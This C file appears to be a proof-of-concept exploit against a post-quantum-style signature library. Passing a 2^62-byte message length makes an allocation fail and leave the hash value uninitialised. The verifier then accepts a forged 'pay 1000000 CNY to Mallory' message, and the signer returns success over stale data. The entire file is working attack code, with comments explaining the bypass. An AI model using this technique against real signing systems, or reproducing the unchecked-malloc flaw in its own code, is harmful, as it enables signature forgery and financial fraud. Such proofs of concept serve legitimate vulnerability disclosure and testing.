#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "drng.h"
#include "SIG_AlgorithmInstance.h"
DRNG_ctx drng_algorithm;
int main(){
  size_t PL=sig_get_pk_len_bytes(),SL=sig_get_sk_len_bytes(),NL=sig_get_sn_len_bytes();
  unsigned char *pk=malloc(PL),*sk=malloc(SL),*sn=malloc(NL); unsigned long long pl,sl,snl;
  unsigned char seed[64]={7}; init_random_number(&drng_algorithm,seed,64);
  sig_keygen(pk,&pl,sk,&sl);
  const char *m1="pay 1 CNY to Alice"; const char *m2="pay 1000000 CNY to Mallory";
  sig_sign(sk,sl,(unsigned char*)m1,strlen(m1),sn,&snl);
  printf("verify(sig1, m1)              = %d\n",sig_verify(pk,pl,sn,snl,(unsigned char*)m1,strlen(m1)));
  printf("verify(sig1, m2)              = %d\n",sig_verify(pk,pl,sn,snl,(unsigned char*)m2,strlen(m2)));
  printf("verify(sig1, m1) again        = %d\n",sig_verify(pk,pl,sn,snl,(unsigned char*)m1,strlen(m1)));
  unsigned long long huge=1ULL<<62;  /* malloc(16+2^62) fails -> Expand_mu returns early, mu uninitialised */
  printf("verify(sig1, m2, len=2^62)    = %d   (0 = ACCEPT)\n",sig_verify(pk,pl,sn,snl,(unsigned char*)m2,huge));
  /* signer side: malloc failure makes sign() emit a signature over stale stack mu, returns success */
  unsigned char *sn2=malloc(NL);
  int rs=sig_sign(sk,sl,(unsigned char*)m2,huge,sn2,&snl);
  printf("sign(m2, len=2^62) returns %d; that sig verifies on m1? %d\n",rs,sig_verify(pk,pl,sn2,snl,(unsigned char*)m1,strlen(m1)));
  return 0;}
